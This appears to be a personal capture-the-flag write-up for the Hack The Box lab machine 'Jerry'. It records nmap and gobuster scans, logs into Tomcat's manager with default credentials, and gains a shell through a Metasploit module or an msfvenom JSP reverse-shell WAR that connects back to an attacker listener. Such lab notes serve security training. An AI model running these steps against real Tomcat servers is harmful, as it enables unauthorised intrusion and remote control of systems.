----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Jerry
# 16/3/2023
10.10.10.95

----------------------------------------------------
# nmap
----------------------------------------------------
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

----------------------------------------------------
# gobuster 
----------------------------------------------------
http://10.10.10.95:8080/manager

/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]

----------------------------------------------------
# exploitation
----------------------------------------------------
use admin:admin on port 8080/manger it gave id pass
user username="tomcat" password="s3cret"
we can clear our session cookie and re enter it with this creds
aslo we can try brute force for defaults creds of tomcat , but this creds works so no need of it

msf exploit(multi/http/tomcat_mgr_upload) > set rhost 10.10.10.95
msf exploit(multi/http/tomcat_mgr_upload) > set rport 8080
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword s3cret
msf exploit(multi/http/tomcat_mgr_upload) > exploit

or msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.108 LPORT=1234 -f war > shell.war
nc -lvp 1234 and do it manually

we got shell as jerry


